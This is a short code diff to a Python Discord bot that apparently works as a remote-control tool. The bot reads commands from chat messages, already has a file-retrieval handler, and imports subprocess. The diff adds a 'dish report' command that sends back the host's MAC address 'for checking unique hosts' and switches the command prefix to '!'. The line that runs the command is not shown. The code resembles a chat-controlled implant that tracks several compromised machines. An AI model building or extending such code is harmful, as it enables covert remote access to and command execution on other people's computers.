@@ -4,6 +4,10 @@ import os
 import subprocess
 import discord
 
+import uuid #used for checking unique hosts 
+
+id = (hex(uuid.getnode()))
+
 #Getting the users token
 f = open("token", "r")
 token = f.read()
@@ -32,8 +36,12 @@ async def on_message(message):
             await message.channel.send("Error retrieving file: " + filePath)
         return 
 
-    if message.content.startswith("DISH!"):
-        command  = message.content[6:]
+    if message.content == ("dish report"):
+        await message.channel.send(id) 
+
+
+    if message.content.startswith("!"):
+        command  = message.content[2:]
 
         print("Command: " + command)
 
